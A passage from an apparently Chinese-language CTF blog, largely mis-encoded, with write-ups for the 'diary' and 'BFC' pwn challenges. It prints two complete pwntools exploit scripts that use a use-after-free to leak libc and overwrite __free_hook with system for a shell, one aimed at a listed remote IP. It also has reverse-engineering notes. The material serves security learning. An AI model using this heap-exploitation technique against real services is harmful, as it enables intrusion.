class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># s = process(&quot;./diary&quot;)</span><br>s = remote(<span class="hljs-string">&quot;119.13.105.35&quot;</span>,<span class="hljs-string">&quot;10111&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">sec,buf</span>):</span><br>payload = <span class="hljs-string">&quot;add#2022#12#10#0#0#&#123;&#125;#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(sec,buf)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,buf</span>):</span><br>payload = <span class="hljs-string">&quot;update#&#123;&#125;#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx,buf)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>payload = <span class="hljs-string">&quot;show#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>payload = <span class="hljs-string">&quot;delete#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc</span>(<span class="hljs-params">idx,offset,length</span>):</span><br>payload = <span class="hljs-string">&quot;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx,offset,length)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec</span>(<span class="hljs-params">idx</span>):</span><br>payload = <span class="hljs-string">&quot;decrypt#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">addr</span>):</span><br>gdb.attach(s,<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(&#123;&#125;)</span><br><span class="hljs-string">set $datevec=*(size_t *)$rebase(0x162F0)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>add(i,<span class="hljs-built_in">str</span>(i))<br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>free(<span class="hljs-number">10</span>-i)<br>    <br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">3</span>)<br>s.recvuntil(<span class="hljs-string">&quot;2022.10.12 0:0:4\n&quot;</span>)<br>heap = u64(s.recvline(keepends=<span class="hljs-literal">False</span>)+<span class="hljs-string">&quot;\x00\x00&quot;</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>libc.address = u64(s.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:]+<span class="hljs-string">&#x27;\x00\x00&#x27;</span>)-<span class="hljs-number">0x1ecbe0</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br>success(<span class="hljs-built_in">hex</span>(heap))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]-<span class="hljs-number">4</span>))<br>enc(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0x2c0</span>-<span class="hljs-number">0x16</span>))<br>add(<span class="hljs-number">40</span>,<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br><br>add(<span class="hljs-number">41</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])[:<span class="hljs-number">6</span>])<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment"># debug(0x4299)</span><br>free(<span class="hljs-number">3</span>)<br><br>s.interactive()<br></code></pre></div></td></tr></table></figure><h3 id="wp2"><a href="#wp2" class="headerlink" title="wp2"></a><a href="https://www.ctfiot.com/85535.html">wp2</a></h3><p>deleteå‡½æ•°å­˜åœ¨uafï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹æ¥æ³„éœ²libcå’Œæ”¹fdï¼Œå †é£æ°´æ¯”è¾ƒå¤æ‚ï¼Œé€ å‡ºtcacheå’Œunsorted biné‡åˆåï¼Œåˆ©ç”¨encryptå‡½æ•°é‡Œçš„callocæœºåˆ¶å¯ä»¥æ”¹fdï¼Œæ‰“mallochookå³å¯</p><p>æ›´éš¾çœ‹æ‡‚â€¦â€¦..çœ‹èµ·æ¥æœ‰onegadget, ç®—äº†ä¸ç ”ç©¶äº†, å®˜æ–¹wpçœ‹äº†å°±å¾—äº†, è¿™ä¸€é¢˜çœ‹äº†è€ä¹…äº†çœ‹ä¸ä¸‹å»äº†. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">ç•¥. <br></code></pre></div></td></tr></table></figure><h3 id="wp-intended"><a href="#wp-intended" class="headerlink" title="wp intended"></a>wp intended</h3><p>The logic of the erase function of vector is as follows:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">iterator <span class="hljs-title">erase</span><span class="hljs-params">(iterator position)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(position + <span class="hljs-number">1</span> != <span class="hljs-built_in">end</span>())<br>        <span class="hljs-built_in">copy</span>(position + <span class="hljs-number">1</span>, finish, position); <span class="hljs-comment">//copy range [position+1,end) into position, so éå¸¸æ˜‚è´µ.</span><br>    --finish;<br>    <span class="hljs-built_in">destroy</span>(finish);<br>    <span class="hljs-keyword">return</span> position;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>If the <code>=</code> operation is not rewritten for the class, the function will call the default operation, that is, directly copy all the contents of the class. if there is a pointer, it will also be copied directly.</p><p>So at the time of <code>destroy(finish);</code>, if the pointer in the class is freed in the destructor, then the copied pointer points to a memory that has been freed.</p><p>Here is an example:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">A</span>()&#123;<br>        a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">0x100</span>];<br>        cout &lt;&lt; <span class="hljs-string">&quot;Call A()&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    ~<span class="hljs-built_in">A</span>() &#123;<br>        <span class="hljs-keyword">delete</span> [] a;<br>        cout &lt;&lt; <span class="hljs-string">&quot;Call ~A();&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">char</span>* a;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">vector&lt;A&gt; <span class="hljs-title">vec_A</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>;<br>    vec_A.<span class="hljs-built_in">erase</span>(vec_A.<span class="hljs-built_in">begin</span>());<br>    <span class="hljs-comment">//after this line, the result is the destructor is called twice. </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>The vulnerability of the challenge is in the delete command. If it is not the last idx deleted, then there will be a pointer pointing the freed chunk, which can be used to leak data with the <code>show</code> command. But it needs to leak the random number before rewritten tcache binsâ€™ fd. Then use the xor in the encryption function to xor the fd of the released chunk into the desired address.</p><p>The random numbers are initialized at the beginning, and they will be used in a subsequent cycle. The length is 0x200, so as long as the content of a normal content is encrypted, the random number can be obtained. It should be noted here that the <code>show</code> command will be truncated by â€˜\x00â€™, so multiple encryptions and shows may be necessary to get complete random numbers.</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">year,month,day,hour,minutes,sec,content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;add#&#x27;</span><br>    cmd += <span class="hljs-built_in">str</span>(year) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(month) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(day) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(hour) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(minutes) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(sec) + <span class="hljs-string">&#x27;#&#x27;</span> + content<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;show#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;delete#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">idx,content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;update#&#x27;</span> + <span class="hljs-built_in">str</span>(idx) + <span class="hljs-string">&#x27;#&#x27;</span> + content<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;decrypt#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">idx,offset,length</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;encrypt#&#x27;</span> + <span class="hljs-built_in">str</span>(idx) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(offset) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(length)<br>    p.sendline(cmd)<br><br><span class="hljs-comment"># p = process(&quot;./diary&quot;)</span><br>ip = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>p = remote(ip,<span class="hljs-number">10111</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<span class="hljs-comment"># idx locate 0-10</span><br>    add(<span class="hljs-number">1971</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">20</span>+i,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,-<span class="hljs-number">1</span>): <span class="hljs-comment"># free 4-10, filled up tcache chunk of size 0x200</span><br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>) <span class="hljs-comment"># left 1 2 3, thus 3 is freed unexpectedly</span><br>show(<span class="hljs-number">2</span>) <span class="hljs-comment"># freed 3 is moved to 2.</span><br><br>p.recvuntil(<span class="hljs-string">&quot;1971.12.12 23:22:23\n&quot;</span>)<br><br>leak_value = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#recieve unsorted fd, where points to libc</span><br><br>info(<span class="hljs-string">&quot;leak_value: &quot;</span> + <span class="hljs-built_in">hex</span>(leak_value))<br><br>__free_hook_ = leak_value + <span class="hljs-number">0x2268</span> - <span class="hljs-number">0xd</span> <span class="hljs-comment">#constant offset</span><br>system = leak_value - <span class="hljs-number">0x19a950</span> <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment">#get 5 chunks from tcache</span><br>    add(<span class="hljs-number">1971</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">40</span>+i,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">6</span>)<br>p.recvuntil(<span class="hljs-string">&quot;23:22:44\n&quot;</span>)<br>heap_value = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<span class="hljs-comment"># just tcache pointing to heap area</span><br>info(<span class="hljs-string">&quot;heap_value: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_value))<br><br><span class="hljs-comment">#now, 2 3(free in unsorted) 1&#x27; 2&#x27; 3&#x27; 4&#x27; 5&#x27;(free in tcache)</span><br><span class="hljs-comment">#     0 1                   2  3  4  5  6</span><br><span class="hljs-comment"># now tcache: 5&#x27; 9 10  unsorted: 3</span><br>need_random_value = heap_value ^ __free_hook_ <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    update(<span class="hljs-number">0</span>,<span class="hljs-built_in">chr</span>(need_random_value&amp;<span class="hljs-number">0xff</span>)*<span class="hljs-number">0x200</span>)<br><span class="hljs-comment">####add ? byte into enc vector</span><br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x200</span>)<span class="hljs-comment"># will calloc 0x200 bytes space</span><br>    show(<span class="hljs-number">0</span>)<br>    data = p.recvuntil(<span class="hljs-string">&quot;input&quot;</span>)<br>    data = data[:-<span class="hljs-number">6</span>]<br>    data = data[<span class="hljs-number">25</span>:]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0x200</span>:<br>        exit()<br>    <span class="hljs-comment">#åˆ°è¿™é‡Œè¯´æ˜éšæœºå­—èŠ‚ä¸²ä¸­å‡ºç°äº†å’Œæƒ³è¦xorçš„å­—èŠ‚ç›¸åŒçš„æ•°å€¼. åˆ©ç”¨è¿™ä¸ªå­—èŠ‚(ç›¸åŒæ•°å­—xoråä¸º0æ— æ³•printf)å»xorä¸€ä¸ªå­—èŠ‚å¦‚line83. </span><br>    update(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x200</span>)<br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data)) <span class="hljs-comment">#not fit exist tcache size, get from top chunk</span><br>    encrypt(<span class="hljs-number">6</span>,i,<span class="hljs-number">1</span>) <span class="hljs-comment">#get 0x20 bytes from top. WHY??</span><br>    <span class="hljs-comment">#æˆ‘è§‰å¾—è¿™ä¸€å¤§å †åŠ å¯†ä¸æ˜¯ä¸ºäº†heapå¸ƒå±€, è€Œæ˜¯ä¸ºäº†å¯¹ä¸€å—åŒºåŸŸä½¿ç”¨xor. </span><br>    update(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x200</span>)<br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x1FF</span>-<span class="hljs-built_in">len</span>(data)) <span class="hljs-comment">#also not fit in. WHY??</span><br>    need_random_value = need_random_value &gt;&gt; <span class="hljs-number">8</span><br><br><br>add(<span class="hljs-number">1972</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">40</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>pause()<br>add(<span class="hljs-number">1972</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">41</span>,<span class="hljs-string">&#x27;;/bin/sh;&#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> p64(system)]))<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>æŠ˜è…¾äº†ä¸€ä¼šå„¿çš„è°ƒè¯•ç¯å¢ƒ, å‘ç°ä½¿ç”¨dockerè°ƒè¯•è¦è£…git pwntools python gdb peda, å—ä¸äº†. </p><ul><li>å§‘ä¸”è¯•äº†äº†åœ¨containeré‡Œé¢è°ƒè¯•, æ”¹å†™compose.yamlä»¥åŠæ¢æº, </li></ul><p>è½¬åˆ°ubuntu2004è™šæ‹Ÿæœºä¸Šç»§ç»­. ä¸»è¦å°±æ˜¯æƒ³çŸ¥é“heapç¯å¢ƒæ˜¯å¦å’Œæˆ‘æƒ³çš„ä¸€æ ·. æœç„¶ä¸ä¸€æ ·, å¿˜è®°äº†0x300å’Œ0x200çš„åŒºåˆ«. </p><ul><li>æ³¨æ„åˆ°substrä¸­æ„é€ äº†æ–°çš„string, ä½¿ç”¨äº†<code>operator *</code>ä¹Ÿå°±æ˜¯mallocå‡½æ•°, è¿™æ˜¯å’Œæ™®é€šçš„cç¨‹åº(è€Œä¸”ç¦ç”¨äº†IOç¼“å†²åŒºçš„é‚£ç§)ä¸ä¸€æ ·çš„åœ°æ–¹, å¤šäº†å¾ˆå¤šæ„æ–™ä¹‹å¤–çš„heapæ“ä½œ, è¦è°¨æ…é€‰æ‹©å¸ƒå±€ä¸­ä½¿ç”¨çš„chunkå¤§å°. </li><li>å…¶ä¸­54è¡Œçš„å‡å»0xdæ˜¯æŒ‡addåæœ€å¼€å§‹å››ä¸ªç©ºæ ¼åŠ ä¸Š<code>;/bin/sh;</code>çš„é•¿åº¦, å¥½è®©line93çš„systemåœ°å€èƒ½å¤Ÿæ”¾åœ¨<code>__free_hook</code>ä¸Š</li><li>free_hookæœ€ç»ˆè¢«mainå‡½æ•°<strong>æœ€å</strong>çš„stringææ„å‡½æ•°è°ƒç”¨, è€Œææ„çš„æ­£æ˜¯æˆ‘ä»¬è¾“å…¥çš„å‘½ä»¤å­—ç¬¦ä¸², æ‰€ä»¥expæ‰§è¡Œå®Œä¼šå‡ºç°<br><code>sh : 1 : add#a#b#... not a command</code>è¿™æ ·çš„æç¤º, ä¹‹åå°±å¯ä»¥å¿«ä¹<code>cat /flag</code>äº†. </li></ul><p>ä¸»è¦å¡åœ¨äº†xorå®é™…ä¸Šæ˜¯ä¸€ç§ä»»æ„å†™, åªè¦å’Œå¾ªç¯ä½¿ç”¨çš„éšæœºæ•°å­—é…åˆå¥½(æŒ‡å¾ªç¯æŸ¥æ‰¾ç›¸åŒæ•°å€¼)å³å¯. ç„¶å<code>__free_hook</code>å¯ä»¥è¢«ææ„å‡½æ•°è°ƒç”¨. </p><h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><blockquote><p>ä»ç„¶æ˜¯C++é€†å‘</p></blockquote><ul><li>7.5ç‰ˆæœ¬è€æ˜¯è‡ªåŠ¨è¯†åˆ«ä¸äº†switchè·³è½¬è¡¨. æ¢æˆæ–°ç‰ˆåç¼–è¯‘åˆæœ‰ç‚¹æ…¢. æŒºéš¾å—çš„.</li><li>å‡ºç°äº†dequeåŒç«¯é˜Ÿåˆ—çš„ä½¿ç”¨. å†™åœ¨Diaryä¸­. </li><li>ä¸€ä¸ªåœ°å€ç¼–ç è®¡ç®—çœ‹äº†å¥½ä¸€ä¼šå„¿â€¦ä¸å¤ªæ•¢æ„ä¼š, è¿˜æ˜¯å‡†ç¡®ä¸€ç‚¹. </li><li>å±…ç„¶æ˜¯2.35çš„libc, è€Œä¸”ç„åˆ°äº†tcacheåˆ©ç”¨, ä¸æ˜¯æœ‰é‚£ä¸ªå•¥ä¿æŠ¤ä¹ˆ. éš¾æå“¦. </li><li>çœ‹initå‡½æ•°çš„æ—¶å€™æŸ¥ç€æŸ¥ç€åˆçœ‹åˆ°ABI, å› ä¸º<a href="https://refspecs.linuxbase.org/LSB_5.0.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa-atexit.html"><code>__cxa_atexit</code></a>å¯¹åº”ç€<a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#dso-dtor-runtime-api">æ ‡å‡†çš„è¿™é‡Œ</a>:<br><code>int __cxa_atexit(void (*func) (void *), void * arg, void * dso_handle);</code><br>é‚£ä¹ˆæœ‰ä¸ª<code>atexit()</code>åˆæ˜¯ä¸ªå•¥? <code>atexit()</code>Â does not deal at all with the ability in most implementations to remove [Dynamic Shared Objects] from a running program image by calling <code>dlclose</code> prior to program termination.</li><li>å·®ç‚¹å¿˜äº†create function. </li><li>ç»ˆäºçŸ¥é“IDAé‡Œrodataæ®µçš„å‡½æ•°ä¸ºä»€ä¹ˆä¼šæ˜¯<code>call    near ptr sub_5555555591E0+1</code>è¿™ç§æ“ä½œäº†, å› ä¸ºè¢«å½“åšå­—ç¬¦ä¸²äº†, å‡ ä¸ªå‡½æ•°ä¹‹é—´æœ‰ç©ºå­—ç¬¦å……å½“ç»“æŸç¬¦å’Œå¯¹é½å­—èŠ‚. </li><li>2.34+çš„libcæ— æ³•ä½¿ç”¨pwndbgçš„heapç­‰æŒ‡ä»¤, å› ä¸ºä¸€ä¸ªå®å®šä¹‰è¢«ä¿®æ”¹äº†. <a href="https://github.com/pwndbg/pwndbg/pull/953/files">issue</a>åœ¨è¿™é‡Œ</li><li><code>probeleak</code> <code>xinfo</code>ç¥å¥‡pwndbgå‘½ä»¤. </li></ul><h3 id="ç»éªŒæ€»ç»“"><a href="#ç»éªŒæ€»ç»“" class="headerlink" title="ç»éªŒæ€»ç»“:"></a>ç»éªŒæ€»ç»“:</h3><ul><li>è¢«dequeå¡ä½. çœ‹äº†STLä¹‹åç†Ÿæ‚‰äº†å¾ˆå¤š. ä¸‹æ¬¡é‡åˆ°set mutiset hashmapåˆå¾—å¡. ç®—äº†åˆ°æ—¶å€™å†è¯´. </li><li>ä»¥åå¯ä»¥å…ˆçœ‹çœ‹<code>.init_array</code>æ®µä¸­å‡ºç°çš„æ„é€ å‡½æ•°, çœ‹çœ‹æœ‰æ²¡æœ‰ç”¨çš„å…¨å±€å˜é‡æç¤º. å°±å¦‚è¿™é‡Œçš„<code>unkn_string_arr</code>. </li><li><strong>åŠ¨é™æ€ç›¸ç»“åˆ</strong>å¯ä»¥æ›´å¿«çš„çœ‹å‡ºä»£ç çš„æ„å›¾. å°±æ¯”å¦‚æœ€é‡è¦æ‰§è¡Œçš„ä»£ç åŒºåŸŸçš„æ ·å­, å‰é¢229å­—èŠ‚ç„¶åä¸€å †callæŒ‡ä»¤, ç›´æ¥è§‚å¯Ÿcallä»€ä¹ˆåœ°å€. </li></ul><h3 id="æµç¨‹-1"><a href="#æµç¨‹-1" class="headerlink" title="æµç¨‹:"></a>æµç¨‹:</h3><p>init:</p><ul><li> ç¬¬ä¸€ä¸ªbuf_16å­˜æ”¾ä¸€ä¸ª0x10å †å—æŒ‡é’ˆ(å¯ä»¥æ”¹å˜). æœ€ç»ˆåœ¨mainçš„æœ€åæŠŠbuf_16çš„åœ°å€ä¹Ÿå°±æ˜¯0x55555555C460ä½œä¸ºå‚æ•°. éš¾æ€ªæœ‰ä»€ä¹ˆa1[5]è¿™ç§å¼•ç”¨. </li></ul>  <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">.bss:<span class="hljs-number">0x00055555555C460</span> [<span class="hljs-number">0</span>] buf_16          dq ?                    ; DATA XREF: init+<span class="hljs-number">97</span>â†‘w<br>.bss:<span class="hljs-number">0x00055555555C460</span>                                         ; main+<span 